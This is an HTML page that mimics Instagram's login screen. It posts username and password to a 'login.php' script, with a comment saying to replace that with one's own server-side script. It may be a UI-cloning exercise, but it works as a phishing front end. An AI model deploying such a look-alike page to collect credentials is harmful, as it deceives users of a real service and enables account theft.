<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
        }
        .container {
            width: 300px;
            margin: 0 auto;
            margin-top: 100px;
            background-color: white;
            padding: 20px;
            border: 1px solid #e6e6e6;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"],
        button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #e6e6e6;
            box-sizing: border-box;
        }
        button {
            background-color: #3897f0;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #357ae8;
        }
        .text-center {
            text-align: center;
        }
        .signup-link {
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Instagram</h2>
        <form action="login.php" method="POST"> <!-- Replace login.php with your server-side script -->
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="text-center">Or</p>
        <p class="text-center">Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="signup-link">
        <p class="text-center">Get the app.</p>
        <p class="text-center">Download from the <a href="#">App Store</a> or <a href="#">Google Play</a>.</p>
    </div>
</body>
</html>
